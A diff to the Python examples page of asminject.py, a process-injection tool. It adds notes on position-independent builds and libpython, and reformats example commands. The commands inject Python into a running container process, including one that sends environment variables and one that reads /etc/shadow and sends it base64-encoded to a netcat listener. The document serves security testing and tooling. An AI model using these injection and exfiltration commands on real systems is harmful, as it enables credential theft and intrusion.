@@ -1,5 +1,12 @@
 # asminject.py examples - Python
 * [Write all global or variables to standard out](#write-all-global-or-local-variables-to-standard-out)
+* [Interact with a container only via injected Python code](#interact-with-a-container-only-via-injected-python-code)
+
+## Important
+
+For all Python 3 examples, refer to the <a href="docs/specialized_options.md#specifying-non-pic-code">position-independent code discussion in the specialized options document</a>. Python 3 before 3.10 is usually not position-independent, but Python 3.10 and later usually are.
+
+Some Linux distributions include builds of Python that place most of its functionality in a separate `libpython` shared library. For that type of environment, you'll need to use the `execute_python_code-libpython.s` payload instead of `execute_python_code.s`.
 
 ## Write all global or local variables to standard out
 
@@ -21,13 +28,19 @@ tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.ite
 e.g.
 
 ```
-# python3 ./asminject.py 249594 execute_python_code.s --arch x86-64 --relative-offsets relative_offsets-usr-bin-python3.9.txt --non-pic-binary "/usr/bin/python3\\.[0-9]+" --stop-method "slow" --var pythoncode "tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items() if not k.startswith('_') and k!='tmp' and k!='In' and k!='Out' and not hasattr(v, '__call__')]"
+# python3 ./asminject.py 249594 execute_python_code.s --arch x86-64 \
+   --relative-offsets-from-binaries \
+   --non-pic-binary "/usr/bin/python3\\.[0-9]+" --stop-method "slow" \
+   --var pythoncode "tmp = globals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items() if not k.startswith('_') and k!='tmp' and k!='In' and k!='Out' and not hasattr(v, '__call__')]"
 ```
 
 or
 
 ```
-# python3 ./asminject.py 249594 execute_python_code.s --arch x86-64 --relative-offsets relative_offsets-usr-bin-python3.9.txt --non-pic-binary "/usr/bin/python3\\.[0-9]+" --stop-method "slow" --var pythoncode "tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items() if not k.startswith('_') and k!='tmp' and k!='In' and k!='Out' and not hasattr(v, '__call__')]"
+# python3 ./asminject.py 249594 execute_python_code.s --arch x86-64 \
+   --relative-offsets-from-binaries \
+   --non-pic-binary "/usr/bin/python3\\.[0-9]+" --stop-method "slow" \
+   --var pythoncode "tmp = locals().copy(); [print(k,'  :  ',v,' type:' , type(v)) for k,v in tmp.items() if not k.startswith('_') and k!='tmp' and k!='In' and k!='Out' and not hasattr(v, '__call__')]"
 ```
 
 Example output:
@@ -114,8 +127,11 @@ listening on [any] 7777 ...
 Then, in another terminal:
 
 ~~~
-# python3 ./asminject.py 2378331 execute_python_code-libpython.s --arch x86-64 --relative-offsets relative-offsets-docker-fedora-libpython3.10.txt --stop-method "slow" --var pythoncode 'import os; import socket; s = socket.socket()
-s.connect((\"127.0.0.1\", 7777)); s.send(f\"{os.environ}\".encode()); s.close()'
+# python3 ./asminject.py 2378331 execute_python_code-libpython.s \
+   --arch x86-64 \
+   --relative-offsets relative-offsets-docker-fedora-libpython3.10.txt \
+   --stop-method "slow" \
+   --var pythoncode 'import os; import socket; s = socket.socket(); s.connect((\"127.0.0.1\", 7777)); s.send(f\"{os.environ}\".encode()); s.close()'
 ~~~
 
 You should see the output in the `nc` listener, e.g.:
@@ -130,7 +146,11 @@ environ({'HOSTNAME': 'copyroom', 'DISTTAG': 'f36container', 'PWD': '/', 'FBR': '
 Copy a file out of the container:
 
 ~~~
-# python3 ./asminject.py 2378331 execute_python_code-libpython.s --arch x86-64 --relative-offsets relative-offsets-docker-fedora-libpython3.10.txt --stop-method "slow" --var pythoncode 'import base64; import os; import socket; f = open(\"/etc/shadow\", mode=\"rb\"); content = f.read(); f.close(); encoded = base64.b64encode(content); s = socket.socket(); s.connect((\"127.0.0.1\", 7777)); s.send(encoded); s.close();'
+# python3 ./asminject.py 2378331 execute_python_code-libpython.s \
+   --arch x86-64 \
+   --relative-offsets relative-offsets-docker-fedora-libpython3.10.txt \
+   --stop-method "slow" \
+   --var pythoncode 'import base64; import os; import socket; f = open(\"/etc/shadow\", mode=\"rb\"); content = f.read(); f.close(); encoded = base64.b64encode(content); s = socket.socket(); s.connect((\"127.0.0.1\", 7777)); s.send(encoded); s.close();'
 ~~~
 
 The base64-encoded version should appear in the netcat listener:
